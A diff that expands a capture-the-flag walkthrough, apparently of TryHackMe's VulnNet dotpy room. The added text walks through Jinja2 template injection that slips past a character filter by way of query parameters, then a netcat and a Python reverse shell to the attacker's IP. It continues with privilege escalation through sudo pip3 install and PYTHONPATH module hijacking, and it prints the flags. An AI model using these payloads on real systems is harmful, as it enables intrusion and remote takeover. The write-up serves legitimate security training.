@@ -163,66 +163,158 @@ hmm doesn't seem like we can `import` stuff inside jinja2...
 
 Another way would be to access `__class__` attributes of string and retrive some function but we can't use `_` .
 
-Hmmm
+Hmmm...
 
-
-
-We can dump the config object
+We can dump the config object (Kept only interesting keys)
 
 ```
-{
-   'ENV':'production',
-   'DEBUG':True,
-   'TESTING':False,
-   'PROPAGATE_EXCEPTIONS':None,
-   'PRESERVE_CONTEXT_ON_EXCEPTION':None,
+{   
    'SECRET_KEY':'S3cr3t_K#Key',
-   'PERMANENT_SESSION_LIFETIME':datetime.timedelta(31),
-   'USE_X_SENDFILE':False,
-   'SERVER_NAME':None,
-   'APPLICATION_ROOT':'/',
-   'SESSION_COOKIE_NAME':'session',
-   'SESSION_COOKIE_DOMAIN':False,
-   'SESSION_COOKIE_PATH':None,
-   'SESSION_COOKIE_HTTPONLY':True,
-   'SESSION_COOKIE_SECURE':False,
-   'SESSION_COOKIE_SAMESITE':None,
-   'SESSION_REFRESH_EACH_REQUEST':True,
-   'MAX_CONTENT_LENGTH':None,
-   'SEND_FILE_MAX_AGE_DEFAULT':datetime.timedelta(0,
-   43200),
-   'TRAP_BAD_REQUEST_ERRORS':None,
-   'TRAP_HTTP_EXCEPTIONS':False,
-   'EXPLAIN_TEMPLATE_LOADING':False,
-   'PREFERRED_URL_SCHEME':'http',
-   'JSON_AS_ASCII':True,
-   'JSON_SORT_KEYS':True,
-   'JSONIFY_PRETTYPRINT_REGULAR':False,
-   'JSONIFY_MIMETYPE':'application/json',
-   'TEMPLATES_AUTO_RELOAD':None,
-   'MAX_COOKIE_SIZE':4093,
    'SQLALCHEMY_DATABASE_URI':'sqlite:////home/web/shuriken-dotpy/db.sqlite3',
-   'SQLALCHEMY_TRACK_MODIFICATIONS':False,
-   'SQLALCHEMY_BINDS':None,
-   'SQLALCHEMY_NATIVE_UNICODE':None,
-   'SQLALCHEMY_ECHO':False,
-   'SQLALCHEMY_RECORD_QUERIES':None,
-   'SQLALCHEMY_POOL_SIZE':None,
-   'SQLALCHEMY_POOL_TIMEOUT':None,
-   'SQLALCHEMY_POOL_RECYCLE':None,
-   'SQLALCHEMY_MAX_OVERFLOW':None,
-   'SQLALCHEMY_COMMIT_ON_TEARDOWN':False,
-   'SQLALCHEMY_ENGINE_OPTIONS':{
-      
-   }
 }
 ```
 
+To go around the `INVALID CHARACTERS` restriction, we can use query parameters to pass data around and retrieve the info using the `request` object.
 
+Our goal is to run something like this to retrieve the `subprocess.Popen` method :
+```
+''.__class__.__mro__[XX].__subclasses__()[XX]
+```
+Once we have this, we have code execution.
+
+To retrieve the value of the query parameters we can use :
+```
+request|attr('args')|attr('get')('PARAMETER_NAME')
+```
+
+As a first test, we run `''.__class__.__name__` with:
+```
+vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))}}?first=__class__&second=__name__
+```
+We validate that we get `str` as a response
+
+
+Then we enumerate all available functions with
+```
+vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|list}}?first=__class__&second=__mro__&third=__subclasses__
+```
+By copying in sublime text and reformating everything, we find that the `subprocess.Popen` method is at index `401`
+
+We can validate this with :
+```
+vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|attr(request|attr('args')|attr('get')('fourth'))(401)}}?first=__class__&second=__mro__&third=__subclasses__&fourth=__getitem__
+```
+
+And then let's run a test command to see if we receive a GET request on our machine:
+```
+vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|attr(request|attr('args')|attr('get')('fourth'))(401)(request|attr('args')|attr('get')('cmd'),shell=True)}}?first=__class__&second=__mro__&third=__subclasses__&fourth=__getitem__&cmd=wget http://10.6.32.20:8000/pwned
+```
+And we got a callback !!
+
+
+Now let's get a reverse shell by changing our `cmd` query parameter 
+(we got to url encode the command otherwise the `&` symbol get in the way)
+
+The reverse shell used is :
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.32.20 7777 >/tmp/f
+```
+
+The full command is :
+```
+vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|attr(request|attr('args')|attr('get')('fourth'))(401)(request|attr('args')|attr('get')('cmd'),shell=True)}}?first=__class__&second=__mro__&third=__subclasses__&fourth=__getitem__&cmd=%2Fbin%2Fsh%20-c%20%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.6.32.20%207777%20%3E%2Ftmp%2Ff%27
+```
+
+And we're in !
+But we are logged as `web` user.
+We need to get access to `system-adm` user to get the user flag.
+
+## Lateral movement
+
+While looking around, we find `/opt/backup.py` owned by root. We can probably inject a dependency there to get root.
+Doesn't seem to be runned in a crontab so probably need to be runned via `sudo` from the `system-adm` user.
+
+Oh welll, i was looking around thinking that I wouldn't be able to run `sudo -l` without a password. Well we can !
+```
+(system-adm) NOPASSWD: /usr/bin/pip3 install *
+```
+
+Looking at `gtfobins` we find this :
+```
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+```
+
+Soo, let's create a `setup.py` file
+
+Hmm this method doesn't work, we get `cannot open /dev/pts/0 : permission denied`
+
+Let's create another revshell in the `setup.py` script
+
+```
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("10.6.32.20",7778))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")' > pwn/setup.py
+```
+
+We run it using 
+```
+sudo -u system-adm /usr/bin/pip3 install ./pwn
+```
+
+And we are now `system-adm` !
+
+`/home/system-adm/user.txt` :
+```
+THM{91c7547864fa1314a306f82a14cd7fb4}
+```
 
 ## Priv esc
+From there, running `sudo -l` gives us :
+```
+User system-adm may run the following commands on vulnnet-dotpy:
+    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
+```
 
+As we hypothesized, we need to inject a module into `/opt/backup.py`
 
+3 modules are loaded in `backup.py`
+```
+from datetime import datetime
+from pathlib import Path
+import zipfile
+```
+
+We can simply create an `__init__.py` file in `/home/system-adm/python_path/zipfile` and set
+```
+export PYTHONPATH=/home/system-adm/python_path
+```
+
+The variable should be preserved due to `SETENV` in sudo
+
+So actually, the variable is not automatically preserved we need
+```
+sudo -E PYTHONPATH=/home/system-adm/python_path /usr/bin/python3 /opt/backup.py
+```
+
+And we get code execution.
+
+For simplicity, we'll just reuse the python revshell code again, opening a 3 revshell as root
+```
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("10.6.32.20",7779))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")' > /home/system-adm/python_path/zipfile/__init__.py
+```
+
+Anddd we are root !
+
+`/root/root.txt`
+```
+THM{734c7c2f0a23a4f590aa8600676021fb}
+```
 
 ## End
 
